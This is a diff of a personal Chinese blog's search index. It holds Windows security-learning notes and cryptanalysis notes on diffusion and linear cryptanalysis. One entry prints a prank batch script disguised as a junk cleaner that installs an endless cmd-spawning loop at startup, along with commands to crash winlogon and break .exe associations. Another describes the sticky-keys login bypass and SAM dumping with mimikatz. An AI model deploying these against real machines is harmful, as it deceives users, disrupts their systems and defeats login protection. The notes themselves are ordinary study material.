+<p>shutdown -s -f -t 100 定时强制关机</p>
+<p>shutdown -r -t 秒 定时重启</p>
+<p>shutdown -a 取消定时</p>
+<p>shutdown -l 注销，同logoff命令相同</p>
+<p>shutdown -s -f -t 100 -c “haah”</p>
+<p><strong>文件操作</strong></p>
+<p>ren 旧名 新名                      重命名</p>
+<p>move 原地址 新地址           移动</p>
+<p>copy 原地址 目的地址         复制粘贴</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>CS_OP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安学习-D-3-批处理，脚本，过时小病毒</title>
+    <url>/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-3-%E6%89%B9%E5%A4%84%E7%90%86%EF%BC%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%87%E6%97%B6%E5%B0%8F%E7%97%85%E6%AF%92/</url>
+    <content><![CDATA[<p>环境：win2003 虚拟机</p>
+<p>只做简单了解，并不深究…</p>
+<h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><p>建一个 txt 文件，后缀名改成 bat 变成批处理文件</p>
+<p>使用的是 <a href="https://www.jianshu.com/p/02f6fe974cfd">DOS 命令语法</a> </p>
+<p><strong>发布博客的批处理文件</strong></p>
+<p>我自己的：</p>
+<ol>
+<li>push</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
+<ol>
+<li>check</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">start <span class="string">&quot;C:\Program Files\Google\Chrome\Application&quot;</span> http://localhost:4000/</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
+<p>3.NewBlog</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line"><span class="built_in">set</span> /p title=Input_NewBlog`s title:</span><br><span class="line">hexo n %title%</span><br></pre></td></tr></table></figure>
+<p><strong>一个小例子</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@echo off         </span><br><span class="line">color <span class="number">0</span>a             </span><br><span class="line">title 飞哥小程序v1<span class="number">.0</span> </span><br><span class="line"> </span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo ==========================</span><br><span class="line">echo               菜单</span><br><span class="line">echo         <span class="number">1</span>、修改管理员密码</span><br><span class="line">echo         <span class="number">2</span>、定时关机</span><br><span class="line">echo         <span class="number">3</span>、退出本程序</span><br><span class="line">echo ===========================</span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span> /p num=您的选择是：   </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;1&quot;</span> <span class="keyword">goto</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;2&quot;</span> <span class="keyword">goto</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;3&quot;</span> <span class="keyword">goto</span> <span class="number">3</span></span><br><span class="line">echo 被闹，好好输！</span><br><span class="line">pause	<span class="comment">//暂停</span></span><br><span class="line"><span class="keyword">goto</span> menu	<span class="comment">//跳转</span></span><br><span class="line"> </span><br><span class="line">:<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> /p u=请输入用户名:	<span class="comment">//set /p 等待变量输入 u 变量</span></span><br><span class="line"><span class="built_in">set</span> /p p=请输入新密码:</span><br><span class="line">net user %u% %p%   &gt;nul		<span class="comment">// &gt;nul 清楚命令执行后系统反馈</span></span><br><span class="line">echo 您的密码已经设置成功!</span><br><span class="line">pause</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line"> </span><br><span class="line">:<span class="number">2</span></span><br><span class="line"><span class="built_in">set</span> /p time=请输入时间：</span><br><span class="line">shutdown -s -t %time%  </span><br><span class="line"><span class="built_in">set</span> /p x=是否取消（<span class="number">1</span>：是，<span class="number">0</span>：否）：</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%x%&quot;</span>==<span class="string">&quot;1&quot;</span> shutdown -a</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line">pause</span><br><span class="line"> </span><br><span class="line">:<span class="number">3</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ossimg.yzitc.com/2022/05/27/ff1fe64a50f38.png"></p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>新建 txt 文件，后缀名改为 vbs（Microsoft <strong>Visual Basic Script</strong> Edition） 即为简单的脚本</p>
+<p>如：</p>
+<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line"> msgbox <span class="string">&quot;I am a script!!&quot;</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
+<p>效果：(一直循环，关不掉，需要在任务管理器中找到进程 wscript.exe 强制关掉)</p>
+<p><img src="https://ossimg.yzitc.com/2022/05/27/80cf40b1595db.png"></p>
+<p>参考：</p>
+<p><a href="https://baike.baidu.com/item/vbs/1700748?fr=aladdin">vbs脚本语言</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/367897802">vbs基本语法1</a></p>
+<p><a href="https://blog.csdn.net/xiaozhi_95/article/details/81669270">vbs基本语法2</a></p>
+<h2 id="过时小病毒"><a href="#过时小病毒" class="headerlink" title="过时小病毒"></a>过时小病毒</h2><p>几个想法：</p>
+<ul>
+<li>添加 开机自启动项，无限弹窗</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line"><span class="built_in">echo</span> =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> :start&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> start cmd&gt;&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> goto start&gt;&gt;c:\windows\windows.bat</span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%&quot;</span>\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\&quot; &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==0 goto next </span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%\「开始」菜单\程序\启动&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==1 goto error</span><br><span class="line">:next</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理中，请不要关闭窗口======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">ping -n 5 127.0.0.1 &gt;nul</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理完毕，共清理垃圾500M===</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 建议立即重启电脑</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:error</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 程序运行失败，请使用【管理员权限】重新运行！======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:ex</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>杀死不能杀死的进程，导致蓝屏 （win2003）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.ex</span><br></pre></td></tr></table></figure>
+<p>ntsd    ：杀死进程</p>
+<p>ntsd -c q -pn 进程名   ：强制杀死进程</p>
+<p>winlogon.exe    ：<a href="https://baike.baidu.com/item/winlogon/11002823?fromtitle=winlogon.exe&amp;fromid=8198444&amp;fr=aladdin">baike</a>    </p>
+<ul>
+<li>修改文件关联，使无法打开（前一章写过）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assoc.exe=txtfile</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>CS_OP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安学习-D-4-用户，组管理</title>
+    <url>/2022/05/29/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-4-%E7%94%A8%E6%88%B7%EF%BC%8C%E7%BB%84%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p>每个用户有自己唯一的 SID（安全标识符），window 系统，通过命令 ：<code>wmic useraccount get name,sid</code> 查看</p>
+<blockquote>
+<p>windows 管理员 administrator 的 UID 是 500，普通用户 1000 开始</p>
+<p>linux 管理员 root 的UID是 0 ，普通用户是1000开始</p>
+</blockquote>
+<p><img src="https://ossimg.yzitc.com/2022/05/29/15a458e7e437a.png"></p>
+<p>windows ，账号密码存储的位置 ：<code>C:\windows\system32\config\SAM</code> 如果通过一定办法拿到 SAM 文件，并暴力搜索可以获得账号密码。</p>
+<h3 id="插曲"><a href="#插曲" class="headerlink" title="插曲"></a>插曲</h3><p>0..0 本机尝试使用 mimikatz来读取SAM数据库，但win7虚拟机下无法下载 mimikatz，尝试使用 Vmware tools 但 win7 由于 认证问题无法安装，尝试办法 <a href="https://blog.csdn.net/teisite/article/details/117675403">解决VMware16在虚拟机Windows7下安装VMware tools问题</a> 未成功；尝试将搭建 win7 与 主机的 ftp 连接，传输 mimikatz 压缩包，待续…</p>
+<p>以上所需步骤：</p>
+<ol>
+<li>搭建主机与虚拟机（win7+）ftp连接；</li>
+<li>将 mimikatz 传输至虚拟机；</li>
+<li>使用 mimikatz 通过以下参考获取账户密码。</li>
+</ol>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/SHENNONGZHAIZHU/article/details/52435519">Windows中的SAM文件</a></p>
+<p><a href="https://blog.csdn.net/qq_41874930/article/details/108149449?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E5%88%B0%20SAM%20%E6%96%87%E4%BB%B6&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-108149449.142^v11^pc_search_result_control_group,157^v12^control&amp;spm=1018.2226.3001.4187">sam文件获取与解密</a></p>
+<p><a href="https://blog.csdn.net/xddtrue/article/details/116596500?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-116596500-blog-52435519.pc_relevant_antiscanv3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-116596500-blog-52435519.pc_relevant_antiscanv3&amp;utm_relevant_index=5">通过SAM文件获取windows7密码</a></p>
+<blockquote>
+<p>system 系统账户，权限至高无上</p>
+<p>local services 本地服务账户 普通权限</p>
+<p>network services 网络服务账户 普通权限</p>
+</blockquote>
+<p>关于用户的一些简单 dos 命令：(切换到管理员用户下CMD)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net user</span><br><span class="line">net user 账户名 字符串   <span class="comment">#修改密码</span></span><br><span class="line">net user 账户名         <span class="comment">#查看账户信息</span></span><br><span class="line">net user 账户名 密码 /add  <span class="comment">#新建账户</span></span><br><span class="line">net user 账户名 /del  <span class="comment">#删除账户</span></span><br><span class="line">net user 账户名 /active:<span class="built_in">yes</span>/no  <span class="comment">#激活或禁用账户</span></span><br></pre></td></tr></table></figure>
+<h2 id="组"><a href="#组" class="headerlink" title="组"></a>组</h2><p>组的作用：简化权限赋予</p>
+<p>赋权限方式：</p>
+<p>1)用户 - 组-赋权限</p>
+<p>2)用户-赋权限</p>
+<p>内置组（系统自带组）</p>
+<p>内置组的权限已经被系统赋予</p>
+<blockquote>
+<p>administrators      #管理员组<br>guests             #来宾组<br>users              #普通用户组<br>network            #网络配置组<br>print              #打印机组<br>Remote Desktop     #远程桌面组</p>
+</blockquote>
+<p>简单的关于组的 dos 命令:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net localgroup     <span class="comment">#查看组</span></span><br><span class="line">net localgroup 组名    <span class="comment">#查看组</span></span><br><span class="line">net localgroup 组名 /add     <span class="comment">#创建组</span></span><br><span class="line">net localgroup 组名 用户名 /add   <span class="comment">#添加组成员	(成员需要存在，net user new_user /add)</span></span><br><span class="line">net localgroup 组名 用户名 /del   <span class="comment">#删除组成员</span></span><br><span class="line">net localgroup 组名 /del       <span class="comment">#删除组</span></span><br></pre></td></tr></table></figure>
+<p>@@</p>
+<p>服务器远程管理</p>
+<p>图形化远程管理</p>
+<p>运行 ：“mstsc”</p>
+<p>telnet（命令行）\</p>
+<p>查看本地上所有开放的端口 cmd “netstat -an”</p>
+<p>telnet：23</p>
+<p>远程桌面协议RDP：3389</p>
+<p>@@</p>
+<p>//没做呢//</p>
+<h2 id="5-次-shift-的-win7-小漏洞"><a href="#5-次-shift-的-win7-小漏洞" class="headerlink" title="5 次 shift 的 win7 小漏洞"></a>5 次 shift 的 win7 小漏洞</h2><p>基本思路：</p>
+<p>在 win 7 登录界面按 5 次 shift 可以会启动 sethc 程序，尝试将该程序换成 cmd.exe 就可以使用命令更改用户密码。</p>
+<p>步骤：</p>
+<blockquote>
+<ol>
+<li>win 7 断电</li>
+<li>启动时进入系统修复界面（如果没出现修复选项，启动时按 F8）</li>
+<li>修复是出现系统还原选择取消，出现“无法修复”的弹窗时，点击查看问题详情会出现一个内部声明（该声明在系统磁盘内，是一个进入系统修改文件的口子。</li>
+<li>点进文档，另存为会出现文件目录，找到 <code>c:\windows\system32</code>目录，将 sethc 程序改名，cmd 程序复制改成 sethc。</li>
+<li>重启系统，在输密码界面再次 5 次 shift，就会启动 cmd（管理员） 而非 sethc，通过命令修改用户密码</li>
+</ol>
+</blockquote>
+]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>CS_OP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Diffusion Basic</title>
+    <url>/2022/05/26/Cryptanalysis/Basic-Diffusion/</url>
+    <content><![CDATA[<p>香农提出了密码设计的两种基本方法即 混淆和扩散。</p>
+<p>分组密码系统包括 线性部分 和 非线性部分，其对应功能分别是 扩散和混淆。</p>
+<p>扩散性往往由线性函数提供，如 rotation ，shift ，或更复杂的 MDS matrix（但其本质也是 rotation and shift）。</p>
+<p>在研究扩散性时，如果往其最基本单元考虑：</p>
+<p>线性运算时一般是 位切片操作，即对每一个 bit 进行运算。那么总体来看就是一个面向 GPU 友好型的 <a href="https://baike.baidu.com/item/%E5%8D%95%E6%8C%87%E4%BB%A4%E6%B5%81%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%B5%81/257612">SIMD</a> 操作 ，对一个 bit 的操作不会影响到其他 bits，显然这是不能够满足扩散性的，那么就需要一些 rotation，shift… 来将 bit 打散，使其能够更多的参与到非线性运算。</p>
+<p>由于 扩散主要是用来使用明文和密文的关系变得尽可能的复杂，明文中任何一点小更动都会使得密文有很大的差异，即达到雪崩效应。</p>
+<blockquote>
+<p>雪崩效应：对于密码而言，要求输入位的 1 bit 变化导致每个输出位 bit 有 50% 的概率发生反转</p>
+</blockquote>
+<p><a href="https://crypto.stackexchange.com/questions/19000/shannon-confusion-and-diffusion-concept/44659#44659">The job of the linear diffusion layer is to ensure that each successive input to the non-linear function consists of a balanced and maximum number of super-positioned input bits.</a></p>
+<p>而验证扩散性是否能够尽可能地达到使密码系统安全的办法，除建立相关性方程，利用如 Mathmatica 等工具来搜索之外，可能还需要考虑由于扩散不全而造成的分支代数次数低，差分线性分析等等。</p>
+]]></content>
+      <tags>
+        <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MITM AttacK</title>
     <url>/2022/05/27/Cryptanalysis/About%20MITM%20and%20variants/</url>
     <content><![CDATA[<h1 id="Classical-MITM"><a href="#Classical-MITM" class="headerlink" title="Classical MITM"></a>Classical MITM</h1><p>在 Hellman 的文章<a href="https://www.computer.org/csdl/magazine/co/1977/06/01646525/13rRUwInvDu">Special Feature Exhaustive Cryptanalysis of the NBS Data Encryption Standard</a>中给出了中间相遇攻击的基本概念。</p>
@@ -131,122 +776,116 @@ D_n = \max (N,\lceil(R \cdot \ell-N \cdot s) / n\rceil)</script>]]></content>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>网安学习-D-2-ip及一些命令</title>
-    <url>/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-2-ip%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<p>ip 相关知识复习及常用 win 系统下的命令</p>
-<h2 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h2><p>局域网：一般称为内网，同一个局域网中，所有IP必须在同一个网段才可以互相通信</p>
-<p>单局域网构成：交换机，网线，pc</p>
-<p>交换机：用来组建内网的局域网的设备</p>
-<h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>网络号（识别主机所在网络） + 主机号（识别网络中的主机）</p>
-<p>position_1.position_2.position_3.position_4  where  position  in [0,255]</p>
-<p>ISO定义五大类：（是以IP地址的第一位进行区分的）</p>
-<ul>
-<li><p>A类：（政府用）</p>
-<p>position_1 网络地址，position_2.position_3.position_4 主机地址</p>
-<p>范围：1.0.0.1—126.155.255.254</p>
-<p>私有地址和保留地址：</p>
-<p>① 10.X.X.X是私有地址（所谓的私有地址就是在互联网上不使用，而被用在局域网络中的地址）<br>② 127.X.X.X是保留地址，用做循环测试用</p>
+    <title>Linear Cryptanalysis</title>
+    <url>/2022/05/25/Cryptanalysis/%E7%BA%BF%E6%80%A7%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="线性分析"><a href="#线性分析" class="headerlink" title="线性分析"></a>线性分析</h1><h2 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h2><p>线性分析通过寻找明密文与密钥间的线性相关性，构造可能产生线性偏差的掩码（搜索）来构造尽量大的线性逼近，从而逐比特的获取密钥信息。</p>
+<p>$Example\ 1$</p>
+<p>最简单的例子：$plaintext\ m,\ ciphertext\ c,\ key\ k = b\ bits$ ，密码系统 $c = m \oplus k$ ，显然该密码系统在不是一次一密的情况下是不安全的，但现在从另一个方面考虑：</p>
+<p>如果逐比特考虑这该密码系统的 3 个变量，则对应比特也满足关系 $c_i = m_i \oplus k_i$ ，$_i$ 表示对应的比特位。那么对于已知明文攻击，就可以通过 $k_i = m_i \oplus c_i$ 来计算获得 $k_i$ 的每一个比特，并还原成 $k$ .这是一种通过明密文的线性关系来逐比特恢复密钥的一个最简单实例，但其并没有较强的说服力.</p>
+<p>$Example\ 2$</p>
+<p>考虑一个稍微复杂的加密系统，密文比特由部分明文比特和密钥比特确定：同样可以通过直接逐比特的写出明密文与密钥的关系来恢复密钥</p>
+<script type="math/tex; mode=display">
+\begin{aligned}
+c_{3} &=m_{3} \oplus m_{1} \oplus m_{0} \oplus k_{3} \oplus k_{1} \oplus k_{0} \\
+c_{2} &=m_{2} \oplus m_{0} \oplus k_{2} \oplus k_{0} \\
+c_{1} &=m_{3} \oplus m_{2} \oplus k_{3} \oplus k_{2}, \text { and } \\
+c_{0} &=m_{1} \oplus m_{0} \oplus k_{1} \oplus k_{0}\\
+i.e.\\
+k_{0} &=m_{0} \oplus c_{0} \oplus c_{3} \\
+k_{1} &=m_{1} \oplus c_{0} \oplus c_{2} \oplus c_{3} \\
+k_{2} &=m_{2} \oplus c_{1} \oplus c_{1} \oplus c_{2}, \text { and } \\
+k_{3} &=m_{3} \oplus c_{0} \oplus c_{1} \oplus c_{2} \oplus c_{3}
+\end{aligned}\\</script><h2 id="CIPHER-A："><a href="#CIPHER-A：" class="headerlink" title="CIPHER_A："></a>CIPHER_A：</h2><p>现在考虑密码系统 CIPHER_A：其中变量均为 4 bits，密钥 8 bits，记为 $k_0||k_1$ ，</p>
+<p><img src="https://ossimg.yzitc.com/2022/05/23/20c5c34e70f97.png"></p>
+<p>该密码系统满足如下关系：$u=m \oplus k_{0}, v=S[u] \text {, and } c=v \oplus k_{1} \text {. }$ 现在需要找到合适的密钥使得 $v=S[u]$ ，试图通过逐比特的恢复密钥，如何能够逐比特的考虑明密文及密钥？将其都做为列向量来考虑，并且用一个行向量来当作<strong>掩码</strong>，表示取或不取该比特：</p>
+<script type="math/tex; mode=display">
+(1,0,0,0) \times\left(\begin{array}{c}
+m_{3} \\
+m_{2} \\
+m_{1} \\
+m_{0}
+\end{array}\right)=m_{3} \text {, and }(0,0,1,0) \times\left(\begin{array}{c}
+m_{3} \\
+m_{2} \\
+m_{1} \\
+m_{0}
+\end{array}\right)=m_{1}</script><p>那么上述的 $Example\ 2$ 就可以表示为：（掩码随机取的，× 表示数量积）</p>
+<script type="math/tex; mode=display">
+(1,0,1,1) \times\left(\begin{array}{l}
+m_{3} \\
+m_{2} \\
+m_{1} \\
+m_{0}
+\end{array}\right) \oplus(1,0,1,1) \times\left(\begin{array}{l}
+k_{3} \\
+k_{2} \\
+k_{1} \\
+k_{0} \\
+\end{array}\right)=m_{3} \oplus m_{1} \oplus m_{0} \oplus k_{3} \oplus k_{1} \oplus k_{0}\\</script><script type="math/tex; mode=display">
+i.e.\ \ \ c_{3}=m_{3} \oplus m_{1} \oplus m_{0} \oplus k_{3} \oplus k_{1} \oplus k_{0}\\</script><script type="math/tex; mode=display">
+i.e.\ \ \ \alpha \cdot c=\beta \cdot m \oplus \beta \cdot k\ \ where\ \alpha=(1,0,0,0) \text { and } \beta=(1,0,1,1)</script><p>也即，可以通过掩码表示明密文相应位和密钥的线性关系（或进行一定的线性变化），掩码为 $\alpha\ and\ \beta$ . 但是仅仅线性的关系对上图的 CIPHER_A 是没有用的，因为存在非线性的 S-box，所以自然的考虑能否通过统计特性，使其逼近该密码系统中的非线性函数，即 S-box ？关系为 $\alpha \cdot x = \beta \cdot S[x]$（注意这里的结果是 0 或 1） 对于一个理想的非线性函数，无论使用任何掩码，该关系满足与否的概率为 $1/2$ ，那又很自然的想到，希望通过穷搜所有掩码来使关系满足的概率偏离 $1/2$ ，即存在<strong>偏差</strong> 。</p>
+<p>以上密码使用掩码表示，并计算其已知偏差：</p>
+<script type="math/tex; mode=display">
+\begin{array}{l}
+(\alpha \cdot m)=\left(\alpha \cdot k_{0}\right) \oplus(\alpha \cdot u) \text { with probability } 1\\
+(\alpha \cdot u)=(\beta \cdot v) \quad \text { with probability } p\\
+(\beta \cdot v)=\left(\beta \cdot k_{1}\right) \oplus(\beta \cdot c) \text { with probability } 1 .
+\end{array}</script><p>只需要考虑中间的式子，进一步，将左边式子和右边式子相乘得到关于明密文及密钥的（化简过）（掩码位）关系式：</p>
+<script type="math/tex; mode=display">
+(\alpha \cdot m) \oplus(\beta \cdot c)=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right) \text { with probability } p \text {. }</script><p>也就是，在直到明密文对的情况下，找到  $\alpha \cdot x = \beta \cdot S[x]$ 关系式的相关信息，就能获得关于密钥的信息。</p>
+<p>如果 $p \ne 1/2$ 即存在偏差，那么就有可能在一定的数据量内获得关于密钥的信息，假设 $p = 1/2 + \varepsilon$ ，则 $0&lt;|\boldsymbol{\varepsilon}| \leq \frac{1}{2}$ 为线性偏差，当然会期望偏差尽量大，因为偏差越大就需要越少的数据量。 </p>
+<p>举例对上述非线性关系式  $\alpha \cdot x = \beta \cdot S[x]$ 的简单线性攻击（这里的 x 满足上述 CIPHER_A的 u 或 v)：</p>
+<p><strong>建立区分器</strong></p>
+<ol>
+<li>穷举所有 $x$ ，并计算 $S[x]$ ;</li>
+<li>对所有的 $x\ and\ S[x]$ 穷举所有掩码 $\alpha\ and\ \beta$ ；</li>
+<li>算出 $\alpha \cdot x = \beta \cdot S[x]$ 的概率（或 $\alpha \cdot x \oplus 1= \beta \cdot S[x]$ 的概率）； </li>
+</ol>
+<p>例子：$p(\alpha \cdot x = \beta \cdot S[x]) = 2/16\ \ and\ \ p(\alpha \cdot x \oplus 1= \beta \cdot S[x]) = 14/16$ </p>
+<p>$i.e.\ \ \ \  p((\alpha \cdot m) \oplus(\beta \cdot c) \oplus 1=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right))=14/16$ </p>
+<script type="math/tex; mode=display">
+\alpha=(1,0,0,1) \text { and } \beta=(0,0,1,0)</script><script type="math/tex; mode=display">
+\begin{array}{|c|cccccccccccccccc|}
+\hline \mathrm{x} & 0 & 1 & 2 & 3 & 4 & 5 & 6 & 7 & 8 & 9 & \mathrm{a} & \mathrm{b} & \mathrm{c} & \mathrm{d} & \mathrm{e} & \mathrm{f} \\
+\hline \mathrm{S}[\mathrm{x}] & \mathrm{f} & \mathrm{e} & \mathrm{b} & \mathrm{c} & 6 & \mathrm{~d} & 7 & 8 & 0 & 3 & 9 & \mathrm{a} & 4 & 2 & 1 & 5 \\
+\hline \hline \alpha \cdot x & 0 & 1 & 0 & 1 & 0 & 1 & 0 & 1 & 1 & 0 & 1 & 0 & 1 & 0 & 1 & 0 \\
+\hline \beta \cdot S[x] & 1 & 1 & 1 & 0 & 1 & 0 & 1 & 0 & 0 & 1 & 0 & 1 & 0 & 1 & 0 & 0 \\
+\hline
+\end{array}</script><p>为了表述清楚：二元域内的运算和比较（module 2）</p>
+<script type="math/tex; mode=display">
+\alpha \cdot x = \beta \cdot S[x] \ \ \rightarrow\ \ (\alpha \cdot m) \oplus(\beta \cdot c)=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right)\ ::\ p = \frac{2}{16}</script><script type="math/tex; mode=display">
+\alpha \cdot x \ne \beta \cdot S[x] \ \ \rightarrow\ \ (\alpha \cdot m) \oplus(\beta \cdot c) \oplus 1=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right)\ ::\ p = \frac{14}{16}</script><p><strong>恢复密钥</strong></p>
+<ol>
+<li><p>设置计数器 $T_0\ and\ T_1$ ，固定掩码 $\alpha\ and\ \beta$ ，使用多对明密文进行测试，计算 $(\alpha \cdot m) \oplus (\beta \cdot c)$ ：</p>
+<p>为 1 ，$T_1$ 计数器＋1</p>
+<p>为 0 ，$T_0$ 计数器 + 1</p>
+<p>（注意这里使用的明密文对数量和偏差的大小有关）</p>
 </li>
-<li><p>B类：（大中型企业用）</p>
-<p>position_1.position_2 网络地址，position_3.position_4 主机地址</p>
-<p>范围：128.0.0.1—191.255.255.254</p>
-<p>私有地址和保留地址：<br>① 172.16.0.0—172.31.255.255是私有地址<br>② 169.254.X.X是保留地址（如果你的IP地址是自动获取IP地址，而你在网络上又没有找到可用的<strong>DHCP服务器</strong>，就会得到其中一个IP）</p>
+<li><p>可以先假设密钥值，观察两个计数器，可以获得 $(\alpha \cdot m) \oplus (\beta \cdot c)$ 的值（ 0 或 1）的分布，再根据相等与否的概率得出密钥信息 $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=0\ or\ 1$ </p>
+<p>注意，并不能确定的获取密钥在该位的取值，只是获取掩码对应的几位之间的信息。</p>
 </li>
-<li><p>C类：(个人使用，最常见)</p>
-<p>position_1.position_2.position_3 网络地址，position_4 主机地址</p>
-<p>范围：192.0.0.1—223.255.255.254</p>
-<p>私有地址：<br>192.168.X.X是私有地址</p>
-</li>
-<li><p>D类：（组播地址）</p>
-<p>不分网络地址和主机地址，它的第1个字节的前四位固定为1110</p>
-</li>
-<li><p>E类：（科研使用）<br>不分网络地址和主机地址，它的第1个字节的前四位固定为11110</p>
-</li>
-</ul>
-<h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>规定 ip 在哪个网段，如 ip ： 192.168.1.1 子网掩码：255.255.240.0</p>
-<p>二进制表示：</p>
-<p>11000000.10101000.00000001.00000001 ip</p>
-<p>11111111.11111111.11110000.00000000 子网掩码 （not = 00000000.00000000.00001111.11111111）</p>
-<p><strong>在子网掩码非 1 的部分为该网段可用地址</strong></p>
-<ul>
-<li>ip 与 子网掩码之间的关系：（保留地址）</li>
-</ul>
-<p>ip and 子网掩码 = 11000000.10101000.00000000.00000000 = 192.168.0.0 为<strong>网络号</strong></p>
-<p>ip or not 子网掩码 =  11000000.10101000.00001111.11111111 = 192.168.15.255 为<strong>广播地址</strong></p>
-<p>所以也可表示为 192.168.1.1/24 （表示该ip子网掩码长度24位1）</p>
-<p>参考： </p>
+</ol>
+<p>例子：</p>
 <blockquote>
-<p><a href="https://blog.csdn.net/wujiafei_njgcxy/article/details/53672410">5类ip地址</a></p>
